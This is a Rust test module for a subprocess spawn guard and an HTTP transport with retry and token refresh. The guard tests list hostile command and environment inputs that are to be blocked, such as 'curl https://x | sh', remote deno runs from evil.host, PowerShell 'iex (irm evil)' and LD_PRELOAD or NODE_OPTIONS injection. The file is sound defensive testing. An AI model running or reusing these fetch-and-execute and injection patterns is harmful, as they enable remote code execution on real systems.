    fn spawn_guard_blocks_getopt_flag_clustering() {
        // The eval flag packed behind benign boolean flags in one getopt cluster is a real
        // inline-eval and must be blocked (`sh -ec`, `python -Ec`, `ruby/perl -we`, node -pe).
        assert!(screen_spawn_command("sh", &argv(&["-ec", "curl https://x | sh"])).is_err());
        assert!(screen_spawn_command("bash", &argv(&["-xec", "id"])).is_err());
        assert!(screen_spawn_command("python", &argv(&["-Ec", "import os"])).is_err());
        assert!(screen_spawn_command("python3", &argv(&["-Ec", "x"])).is_err());
        assert!(screen_spawn_command("ruby", &argv(&["-we", "system('x')"])).is_err());
        assert!(screen_spawn_command("perl", &argv(&["-we", "system('x')"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["-pe", "process.exit()"])).is_err());
        // Value-taking flags swallow the rest of the token and must NOT be read as an eval
        // (no false positives on real invocations).
        assert!(screen_spawn_command("python", &argv(&["-mhttp.server"])).is_ok());
        assert!(screen_spawn_command("python", &argv(&["-Wignore::DeprecationWarning", "a.py"])).is_ok());
        assert!(screen_spawn_command("bash", &argv(&["-o", "pipefail", "script.sh"])).is_ok());
        assert!(screen_spawn_command("ruby", &argv(&["-Ilib", "app.rb"])).is_ok());
        assert!(screen_spawn_command("perl", &argv(&["-Ilib", "app.pl"])).is_ok());
        // Plain non-clustered invocations still classify correctly.
        assert!(screen_spawn_command("python", &argv(&["-c", "x"])).is_err());
        assert!(screen_spawn_command("python", &argv(&["server.py"])).is_ok());
        assert!(screen_spawn_command("bash", &argv(&["script.sh"])).is_ok());
    }

    #[test]
    fn spawn_guard_closes_deno_bun_basename_and_env_bypasses() {
        // deno/bun: a value-taking flag before the subcommand can't hide a remote fetch-exec.
        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["run", "https://evil.ts"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["run", "data:text/javascript,alert(1)"])).is_err());
        assert!(screen_spawn_command("bun", &argv(&["--cwd", "/x", "run", "https://evil"])).is_err());
        // A local deno run stays allowed.
        assert!(screen_spawn_command("deno", &argv(&["run", "./server.ts"])).is_ok());
        // Multi-dot / versioned interpreter names still dispatch to the interpreter family.
        assert!(screen_spawn_command("python3.10", &argv(&["-c", "x"])).is_err());
        assert!(screen_spawn_command("C:\\py\\python3.11.exe", &argv(&["-c", "x"])).is_err());
        // New wrappers and qemu-* user-mode emulators are refused.
        assert!(screen_spawn_command("strace", &argv(&["node", "-e", "x"])).is_err());
        assert!(screen_spawn_command("bwrap", &argv(&["python", "-c", "x"])).is_err());
        assert!(screen_spawn_command("qemu-x86_64", &argv(&["/bin/node", "-e", "x"])).is_err());
        // New always-blocked env vars; a benign var stays fine.
        assert!(screen_spawn_env(&[("ZDOTDIR".into(), "/tmp/evil".into())]).is_err());
        assert!(screen_spawn_env(&[("GCONV_PATH".into(), "/tmp/evil".into())]).is_err());
        assert!(screen_spawn_env(&[("NODE_ENV".into(), "production".into())]).is_ok());
    }

    #[test]
    fn spawn_guard_review_followups() {
        // Windows py/pyw launchers forward -c and version selectors to python.
        assert!(screen_spawn_command("py", &argv(&["-c", "import os"])).is_err());
        assert!(screen_spawn_command("pyw", &argv(&["-c", "x"])).is_err());
        assert!(screen_spawn_command("py", &argv(&["-3.11", "-c", "x"])).is_err());
        assert!(screen_spawn_command("py", &argv(&["-3.11", "script.py"])).is_ok());
        // A global value option can't hide the deno eval subcommand.
        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "eval", "Deno.exit()"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"])).is_err());
        // Only the executable target is remote-checked; a URL passed as an app arg is fine.
        assert!(screen_spawn_command("deno", &argv(&["run", "./server.ts", "--url", "https://api.example.com"])).is_ok());
        assert!(screen_spawn_command("bun", &argv(&["run", "server.ts", "--url", "https://api.example.com"])).is_ok());
        // `--` ends interpreter options, so a cluster-shaped APP arg after it isn't screened.
        assert!(screen_spawn_command("python", &argv(&["server.py", "--", "-Ec"])).is_ok());
    }

    #[test]
    fn spawn_guard_env_wrapper_screens_inner_command_and_assignments() {
        // The common `env VAR=val <cmd>` pattern is allowed, with the real command screened.
        assert!(screen_spawn_command("env", &argv(&["FOO=bar", "node", "server.js"])).is_ok());
        assert!(screen_spawn_command("/usr/bin/env", &argv(&["A=1", "python", "main.py"])).is_ok());
        // ...but a dangerous inner command is still caught through env.
        assert!(screen_spawn_command("env", &argv(&["FOO=bar", "node", "-e", "evil()"])).is_err());
        assert!(screen_spawn_command("env", &argv(&["python", "-c", "x"])).is_err());
        // ...and a code-injecting assignment is caught (screened like the env field).
        assert!(screen_spawn_command("env", &argv(&["LD_PRELOAD=/tmp/pwn.so", "node", "s.js"])).is_err());
        // env with its own flags is unusual and fails closed.
        assert!(screen_spawn_command("env", &argv(&["-S", "node -e evil()"])).is_err());
        assert!(screen_spawn_command("env", &argv(&["-u", "PATH", "node", "-e", "x"])).is_err());
    }

    #[test]
    fn spawn_guard_blocks_deno_bun_remote_and_awk() {
        // Deno/Bun remote specifiers (registry + serve), beyond plain http(s).
        assert!(screen_spawn_command("deno", &argv(&["run", "-A", "npm:@evil/rce"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["run", "jsr:@evil/pkg"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["serve", "https://evil.host/x.ts"])).is_err());
        assert!(screen_spawn_command("bun", &argv(&["run", "https://evil.host/x.ts"])).is_err());
        // Local/registry-package normal usage still passes.
        assert!(screen_spawn_command("deno", &argv(&["run", "-A", "./server.ts"])).is_ok());
        assert!(screen_spawn_command("bun", &argv(&["run", "start"])).is_ok());
        // awk inline program (no -f) is code; `awk -f script.awk` is a file and allowed.
        assert!(screen_spawn_command("awk", &argv(&["BEGIN{system(\"x\")}"])).is_err());
        assert!(screen_spawn_command("gawk", &argv(&["-e", "BEGIN{system(\"x\")}"])).is_err());
        assert!(screen_spawn_command("awk", &argv(&["-f", "script.awk", "data.txt"])).is_ok());
        // php begin-code.
        assert!(screen_spawn_command("php", &argv(&["-B", "system('x');", "-R", "0"])).is_err());
    }

    #[test]
    fn spawn_guard_blocks_more_interpreters_and_shells() {
        assert!(screen_spawn_command("osascript", &argv(&["-e", "do shell script \"x\""])).is_err());
        assert!(screen_spawn_command("elixir", &argv(&["-e", "System.cmd(0,0)"])).is_err());
        assert!(screen_spawn_command("lua", &argv(&["-e", "os.execute('x')"])).is_err());
        assert!(screen_spawn_command("Rscript", &argv(&["-e", "system('x')"])).is_err());
        assert!(screen_spawn_command("julia", &argv(&["-e", "run(`x`)"])).is_err());
        // Windows `cmd /c` / `/k` was previously unscreened (only pwsh was listed).
        assert!(screen_spawn_command("cmd", &argv(&["/c", "evil.bat"])).is_err());
        assert!(screen_spawn_command("cmd.exe", &argv(&["/k", "evil"])).is_err());
        // Running a real script file is fine.
        assert!(screen_spawn_command("lua", &argv(&["server.lua"])).is_ok());
        assert!(screen_spawn_command("Rscript", &argv(&["app.R"])).is_ok());
    }

    #[test]
    fn spawn_guard_blocks_powershell_encoded_and_abbreviated() {
        // -EncodedCommand (base64) and its -e/-ec/-enc aliases run arbitrary code.
        assert!(screen_spawn_command("pwsh", &argv(&["-EncodedCommand", "ZWNobyBw"])).is_err());
        assert!(screen_spawn_command("powershell", &argv(&["-enc", "ZWNobyBw"])).is_err());
        assert!(screen_spawn_command("pwsh", &argv(&["-e", "ZWNobyBw"])).is_err());
        assert!(screen_spawn_command("pwsh", &argv(&["-ec", "ZWNobyBw"])).is_err());
        assert!(screen_spawn_command("pwsh", &argv(&["-EncodedCommand:ZWNobw"])).is_err());
        // Any abbreviation of -Command runs a command line.
        assert!(screen_spawn_command("pwsh", &argv(&["-com", "iex (irm evil)"])).is_err());
        assert!(screen_spawn_command("pwsh.exe", &argv(&["-c", "iex (irm evil)"])).is_err());
        // A real script and benign switches are allowed (no over-blocking).
        assert!(screen_spawn_command("pwsh", &argv(&["-File", "server.ps1"])).is_ok());
        assert!(screen_spawn_command("pwsh", &argv(&["-NoProfile", "-File", "server.ps1"])).is_ok());
        assert!(screen_spawn_command(
            "pwsh",
            &argv(&["-ExecutionPolicy", "Bypass", "-File", "s.ps1"])
        )
        .is_ok());
    }

    #[test]
    fn spawn_guard_blocks_deno_eval_and_remote_run() {
        // Deno's lethal invocations are SUBCOMMANDS, not flags.
        assert!(screen_spawn_command("deno", &argv(&["eval", "Deno.exit()"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["run", "-A", "https://evil.host/x.ts"])).is_err());
        // A normal local `deno run` is allowed.
        assert!(screen_spawn_command("deno", &argv(&["run", "-A", "./server.ts"])).is_ok());
    }

    #[test]
    fn spawn_guard_blocks_node_attached_require() {
        // `-r<module>` attached (no `=`) previously slipped the equality check.
        assert!(screen_spawn_command("node", &argv(&["-r./pwn.js", "server.js"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["--loader", "./pwn.mjs", "server.js"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["dist/server.js"])).is_ok());
    }

    #[test]
    fn spawn_env_blocks_code_injection_vars() {
        let e = |k: &str, v: &str| vec![(k.to_string(), v.to_string())];
        // Always-refused: no benign value.
        assert!(screen_spawn_env(&e("LD_PRELOAD", "/tmp/pwn.so")).is_err());
        assert!(screen_spawn_env(&e("DYLD_INSERT_LIBRARIES", "/tmp/pwn.dylib")).is_err());
        assert!(screen_spawn_env(&e("BASH_ENV", "/tmp/pwn.sh")).is_err());
        // Case-only evasion is defeated (key is uppercased).
        assert!(screen_spawn_env(&e("ld_preload", "/tmp/pwn.so")).is_err());
        // NODE_OPTIONS: preload/eval options refused, benign tuning allowed.
        assert!(screen_spawn_env(&e("NODE_OPTIONS", "--require ./pwn.js")).is_err());
        assert!(screen_spawn_env(&e("NODE_OPTIONS", "--loader=./pwn.mjs")).is_err());
        assert!(screen_spawn_env(&e("NODE_OPTIONS", "--max-old-space-size=4096")).is_ok());
        // RUBYOPT: -r/-e refused, benign tuning (-W0) allowed (no longer all-or-nothing).
        assert!(screen_spawn_env(&e("RUBYOPT", "-rpwn")).is_err());
        assert!(screen_spawn_env(&e("RUBYOPT", "-W0")).is_ok());
        // JVM agent injection refused; benign JVM tuning allowed.
        assert!(screen_spawn_env(&e("JAVA_TOOL_OPTIONS", "-javaagent:/tmp/pwn.jar")).is_err());
        assert!(screen_spawn_env(&e("_JAVA_OPTIONS", "-agentlib:pwn")).is_err());
        assert!(screen_spawn_env(&e("JAVA_TOOL_OPTIONS", "-Xmx512m")).is_ok());
        // Ordinary server config env is fine.
        assert!(screen_spawn_env(&e("API_TOKEN", "sk-123")).is_ok());
        // PERL5OPT: -M/-m module preload and -d debugger run code (refused); benign
        // tuning like -w is allowed.
        assert!(screen_spawn_env(&e("PERL5OPT", "-Mstrict")).is_err());
        assert!(screen_spawn_env(&e("PERL5OPT", "-d:Trace=x")).is_err());
        assert!(screen_spawn_env(&e("PERL5OPT", "-w")).is_ok());
        assert!(screen_spawn_env(&[]).is_ok());
    }

    #[test]
    #[cfg(windows)]
    fn resolves_bare_command_via_pathext() {
        // `cmd` is always on PATH on Windows; it should resolve to a real file.
        let resolved = resolve_command("cmd");
        assert!(
            resolved.to_lowercase().ends_with("cmd.exe"),
            "expected cmd.exe, got {resolved}"
        );
    }

    #[test]
    fn backoff_doubles_and_caps() {
        use super::{backoff_delay, HTTP_RETRY_BASE, HTTP_RETRY_CAP};
        assert_eq!(backoff_delay(0), HTTP_RETRY_BASE);
        assert_eq!(backoff_delay(1), HTTP_RETRY_BASE * 2);
        assert_eq!(backoff_delay(2), HTTP_RETRY_BASE * 4);
        // Large attempts saturate at the cap, never overflow.
        assert_eq!(backoff_delay(30), HTTP_RETRY_CAP);
    }

    #[test]
    fn retry_after_parses_delta_seconds_and_caps() {
        use super::{retry_after_delay, HTTP_RETRY_CAP};
        use std::time::Duration;
        assert_eq!(retry_after_delay("2"), Some(Duration::from_secs(2)));
        assert_eq!(retry_after_delay("  5 "), Some(Duration::from_secs(5)));
        // Over the cap is clamped to the cap.
        assert_eq!(retry_after_delay("9999"), Some(HTTP_RETRY_CAP));
        // HTTP-date form and junk are not delta-seconds: no delay parsed.
        assert_eq!(retry_after_delay("Wed, 21 Oct 2026 07:28:00 GMT"), None);
        assert_eq!(retry_after_delay(""), None);
    }

    #[test]
    fn bearer_header_adds_scheme_once() {
        assert_eq!(super::bearer_header("sk-123"), "Bearer sk-123");
        assert_eq!(super::bearer_header("Bearer sk-123"), "Bearer sk-123");
        assert_eq!(super::bearer_header("bearer sk-123"), "bearer sk-123");
    }

    #[test]
    fn ids_match_tolerates_number_vs_string() {
        use super::ids_match;
        use serde_json::json;
        assert!(ids_match(Some(&json!(1)), Some(&json!(1))));
        // A server that echoes the numeric id as a string still matches.
        assert!(ids_match(Some(&json!("1")), Some(&json!(1))));
        assert!(ids_match(Some(&json!(1)), Some(&json!("1"))));
        assert!(!ids_match(Some(&json!(2)), Some(&json!(1))));
        // No id requested -> take the first message.
        assert!(ids_match(Some(&json!(1)), None));
        // Wanted an id but the message has none -> no match.
        assert!(!ids_match(None, Some(&json!(1))));
    }

    #[test]
    fn recognizes_a_tools_list_changed_notification() {
        use super::is_list_changed;
        assert!(is_list_changed(
            r#"{"jsonrpc":"2.0","method":"notifications/tools/list_changed"}"#
        ));
        assert!(is_list_changed(
            "  {\"jsonrpc\":\"2.0\",\"method\":\"notifications/tools/list_changed\"}\n"
        ));
        // A response to our own tools/list call is not the notification.
        assert!(!is_list_changed(r#"{"jsonrpc":"2.0","id":3,"result":{"tools":[]}}"#));
        // Other notifications and unrelated lines are ignored (and skip the parse).
        assert!(!is_list_changed(
            r#"{"jsonrpc":"2.0","method":"notifications/message","params":{}}"#
        ));
        assert!(!is_list_changed("not json at all"));
        assert!(!is_list_changed(""));
    }

    #[test]
    fn classifies_each_list_changed_kind() {
        use super::{change, list_changed_kind};
        assert_eq!(
            list_changed_kind(r#"{"jsonrpc":"2.0","method":"notifications/tools/list_changed"}"#),
            change::TOOLS
        );
        assert_eq!(
            list_changed_kind(
                r#"{"jsonrpc":"2.0","method":"notifications/resources/list_changed"}"#
            ),
            change::RESOURCES
        );
        assert_eq!(
            list_changed_kind(
                r#"{"jsonrpc":"2.0","method":"notifications/prompts/list_changed"}"#
            ),
            change::PROMPTS
        );
        // resources/updated is a different notification, not a list change.
        assert_eq!(
            list_changed_kind(r#"{"jsonrpc":"2.0","method":"notifications/resources/updated"}"#),
            0
        );
        assert_eq!(list_changed_kind("not json"), 0);
        assert_eq!(list_changed_kind(""), 0);
    }

    #[test]
    fn forward_line_flags_dirty_only_when_armed() {
        use super::{change, forward_line};
        use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
        use std::sync::Arc;

        let notif = r#"{"jsonrpc":"2.0","method":"notifications/tools/list_changed"}"#;
        let dirty = Some(Arc::new(AtomicU8::new(0)));
        let armed = Arc::new(AtomicBool::new(false));
        let (tx, rx) = std::sync::mpsc::channel();

        // Unarmed (still in the handshake window): the line is forwarded but the
        // change is not acted on.
        assert!(forward_line(notif.to_string(), &tx, &dirty, &armed));
        assert_eq!(dirty.as_ref().unwrap().load(Ordering::SeqCst), 0);
        assert_eq!(rx.recv().unwrap(), notif);

        // Armed: the same notification now sets the TOOLS bit.
        armed.store(true, Ordering::SeqCst);
        assert!(forward_line(notif.to_string(), &tx, &dirty, &armed));
        assert_eq!(dirty.as_ref().unwrap().load(Ordering::SeqCst), change::TOOLS);
        assert_eq!(rx.recv().unwrap(), notif);

        // A resources/list_changed sets the RESOURCES bit alongside it (OR, not
        // overwrite), so distinct changes between watcher ticks aren't lost.
        let res_notif = r#"{"jsonrpc":"2.0","method":"notifications/resources/list_changed"}"#;
        assert!(forward_line(res_notif.to_string(), &tx, &dirty, &armed));
        assert_eq!(
            dirty.as_ref().unwrap().load(Ordering::SeqCst),
            change::TOOLS | change::RESOURCES
        );
        assert_eq!(rx.recv().unwrap(), res_notif);

        // An ordinary line is always forwarded and never flags a change.
        let resp = r#"{"jsonrpc":"2.0","id":1,"result":{}}"#;
        let dirty2 = Some(Arc::new(AtomicU8::new(0)));
        assert!(forward_line(resp.to_string(), &tx, &dirty2, &armed));
        assert_eq!(dirty2.as_ref().unwrap().load(Ordering::SeqCst), 0);
        assert_eq!(rx.recv().unwrap(), resp);

        // A closed receiver makes forward_line report "stop".
        drop(rx);
        assert!(!forward_line(notif.to_string(), &tx, &dirty, &armed));
    }

    #[test]
    fn post_refreshes_proactively_before_sending() {
        use super::{HttpTransport, RefreshFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::{Arc, Mutex};
        use std::time::Duration;

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let seen_auth = Arc::new(Mutex::new(String::new()));
        let captured = Arc::clone(&seen_auth);
        let handle = std::thread::spawn(move || {
            let req = server
                .recv_timeout(Duration::from_secs(3))
                .unwrap()
                .expect("proactively refreshed request should reach the server");
            *captured.lock().unwrap() = req
                .headers()
                .iter()
                .find(|h| h.field.equiv("Authorization"))
                .map(|h| h.value.as_str().to_string())
                .unwrap_or_default();
            let ct =
                tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
                    .unwrap();
            let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
            let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
        });

        let refresh_calls = Arc::new(AtomicUsize::new(0));
        let calls = Arc::clone(&refresh_calls);
        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
            assert!(!force, "successful proactive refresh should avoid a forced retry");
            calls.fetch_add(1, Ordering::SeqCst);
            Ok(Some("fresh".to_string()))
        }));
        let url = format!("http://127.0.0.1:{port}/");
        let mut transport =
            HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);

        let result = transport
            .post(
                &serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }),
                true,
            )
            .expect("post should use the proactively refreshed token");
        handle.join().unwrap();

        assert!(result.is_some());
        assert_eq!(refresh_calls.load(Ordering::SeqCst), 1);
        assert_eq!(*seen_auth.lock().unwrap(), "Bearer fresh");
    }

    #[test]
    fn post_uses_current_token_when_proactive_refresh_fails() {
        use super::{HttpTransport, RefreshFn};
        use std::sync::{Arc, Mutex};

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let seen_auth = Arc::new(Mutex::new(String::new()));
        let captured = Arc::clone(&seen_auth);
        let handle = std::thread::spawn(move || {
            let req = server.recv().unwrap();
            *captured.lock().unwrap() = req
                .headers()
                .iter()
                .find(|h| h.field.equiv("Authorization"))
                .map(|h| h.value.as_str().to_string())
                .unwrap_or_default();
            let ct =
                tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
                    .unwrap();
            let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
            let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
        });

        let refresh: Option<RefreshFn> = Some(Box::new(|force| {
            assert!(!force);
            Err("temporary OAuth endpoint failure".to_string())
        }));
        let url = format!("http://127.0.0.1:{port}/");
        let mut transport =
            HttpTransport::with_auth_refresh(&url, Some("still-valid".to_string()), refresh);

        let result = transport.post(
            &serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }),
            true,
        );
        handle.join().unwrap();

        assert!(result.is_ok());
        assert_eq!(*seen_auth.lock().unwrap(), "Bearer still-valid");
    }

    #[test]
    fn inline_post_refreshes_token_and_retries_on_401() {
        use super::{HttpTransport, RefreshFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::{Arc, Mutex};

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let retry_auth = Arc::new(Mutex::new(String::new()));
        let hits = Arc::new(AtomicUsize::new(0));
        let (captured, hit_count) = (Arc::clone(&retry_auth), Arc::clone(&hits));
        let handle = std::thread::spawn(move || {
            for _ in 0..2 {
                let req = server.recv().unwrap();
                if hit_count.fetch_add(1, Ordering::SeqCst) == 0 {
                    let _ = req.respond(
                        tiny_http::Response::from_string("unauthorized").with_status_code(401),
                    );
                } else {
                    *captured.lock().unwrap() = req
                        .headers()
                        .iter()
                        .find(|h| h.field.equiv("Authorization"))
                        .map(|h| h.value.as_str().to_string())
                        .unwrap_or_default();
                    let _ = req.respond(
                        tiny_http::Response::from_string("{}").with_status_code(202),
                    );
                }
            }
        });

        let refresh: Option<RefreshFn> = Some(Box::new(|force| {
            if force {
                Ok(Some("fresh".to_string()))
            } else {
                Ok(None)
            }
        }));
        let url = format!("http://127.0.0.1:{port}/");
        let mut transport =
            HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);

        transport
            .send_post_no_response(&serde_json::json!({
                "jsonrpc": "2.0",
                "id": 99,
                "result": { "roots": [] }
            }))
            .expect("inline reply should refresh and retry");
        handle.join().unwrap();

        assert_eq!(hits.load(Ordering::SeqCst), 2);
        assert_eq!(*retry_auth.lock().unwrap(), "Bearer fresh");
    }

    #[test]
    fn post_refreshes_token_and_retries_on_401() {
        use super::{HttpTransport, RefreshFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::{Arc, Mutex};

        // Mock MCP server: 401 on the first POST (token expired), 200 JSON-RPC on
        // the retry. Record the Authorization header on the second request.
        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let retry_auth = Arc::new(Mutex::new(String::new()));
        let hits = Arc::new(AtomicUsize::new(0));
        let (ra, hc) = (Arc::clone(&retry_auth), Arc::clone(&hits));
        let handle = std::thread::spawn(move || {
            for _ in 0..2 {
                let req = match server.recv() {
                    Ok(r) => r,
                    Err(_) => return,
                };
                let auth = req
                    .headers()
                    .iter()
                    .find(|h| h.field.equiv("Authorization"))
                    .map(|h| h.value.as_str().to_string())
                    .unwrap_or_default();
                if hc.fetch_add(1, Ordering::SeqCst) == 0 {
                    let _ = req.respond(
                        tiny_http::Response::from_string("unauthorized").with_status_code(401),
                    );
                } else {
                    *ra.lock().unwrap() = auth;
                    let ct =
                        tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
                            .unwrap();
                    let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                    let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                }
            }
        });

        let url = format!("http://127.0.0.1:{port}/");
        let refresh: Option<RefreshFn> = Some(Box::new(|force| {
            if force {
                Ok(Some("fresh".to_string()))
            } else {
                Ok(None)
            }
        }));
        let mut t = HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
        let res = t
            .post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true)
            .expect("post should succeed after the token refresh");
        handle.join().unwrap();

        assert!(res.is_some(), "got the 200 result after refreshing");
        assert_eq!(hits.load(Ordering::SeqCst), 2, "exactly one 401 then one retry");
        assert_eq!(*retry_auth.lock().unwrap(), "Bearer fresh", "retry used the new token");
    }

    #[test]
    fn post_returns_retry_on_429_with_retry_after() {
        use super::{HttpTransport, TransportError};
        use std::sync::Arc;
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::time::Duration;

        // Mock MCP server: 429 with Retry-After: 2 on the first request,
        // 200 JSON-RPC on the second.
        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let hits = Arc::new(AtomicUsize::new(0));
        let hc = Arc::clone(&hits);
        let handle = std::thread::spawn(move || {
            for _ in 0..2 {
                let req = match server.recv() {
                    Ok(r) => r,
                    Err(_) => return,
                };
                if hc.fetch_add(1, Ordering::SeqCst) == 0 {
                    let ra = tiny_http::Header::from_bytes(&b"Retry-After"[..], &b"2"[..]).unwrap();
                    let _ = req.respond(
                        tiny_http::Response::from_string("rate limited")
                            .with_status_code(429)
                            .with_header(ra),
                    );
                } else {
                    let ct = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..]).unwrap();
                    let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                    let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                }
            }
        });

        let url = format!("http://127.0.0.1:{port}/");
        let mut t = HttpTransport::new(&url);

        // First call: should get a Retry signal, NOT an Ok or Fatal.
        let result = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true);
        match &result {
            Err(TransportError::Retry { retry_after, .. }) => {
                assert_eq!(*retry_after, Some(Duration::from_secs(2)));
            }
            other => panic!("expected TransportError::Retry, got {other:?}"),
        }

        // Second call: the server now responds 200.
        let result2 = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 2, "method": "ping" }), true);
        assert!(result2.is_ok(), "second call should succeed: {result2:?}");
        assert_eq!(hits.load(Ordering::SeqCst), 2);

        handle.join().unwrap();
    }

    #[test]
    fn normalize_invocation_splits_unsplit_command() {
        use super::normalize_invocation;
        let s = |v: &[&str]| v.iter().map(|x| x.to_string()).collect::<Vec<_>>();
        // The bug case: whole invocation packed into `command`, empty args.
        assert_eq!(
            normalize_invocation("npx -y @modelcontextprotocol/server-github", &[]),
            ("npx".into(), s(&["-y", "@modelcontextprotocol/server-github"])),
        );
        // Args with slashes (a package path or a filesystem root) survive the split.
        assert_eq!(
            normalize_invocation("npx -y @scope/fs /srv", &[]),
            ("npx".into(), s(&["-y", "@scope/fs", "/srv"])),
        );
        // Already-split configs are untouched.
        assert_eq!(
            normalize_invocation("npx", &s(&["-y", "pkg"])),
            ("npx".into(), s(&["-y", "pkg"])),
        );
        // A bare command with no args stays bare.
        assert_eq!(normalize_invocation("uvx", &[]), ("uvx".into(), vec![]));
        // A real executable path (has a slash) is never split, even with spaces.
        assert_eq!(
            normalize_invocation("/usr/bin/my tool", &[]),
            ("/usr/bin/my tool".into(), vec![]),
        );
    }

    #[test]
    fn post_returns_retry_on_transport_error() {
        use super::{HttpTransport, TransportError};

        // A dead port: connection refused, which is a retryable transport error.
        let mut t = HttpTransport::new("http://127.0.0.1:1/");
        let result = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true);
        match &result {
            Err(TransportError::Retry { retry_after, .. }) => {
                assert!(retry_after.is_none());
            }
            Err(TransportError::Fatal(msg)) => {
                // On some systems port 1 may produce a different error class.
                eprintln!("got Fatal instead of Retry (OS-dependent): {msg}");
            }
            other => panic!("expected Retry or Fatal, got {other:?}"),
        }
    }
}
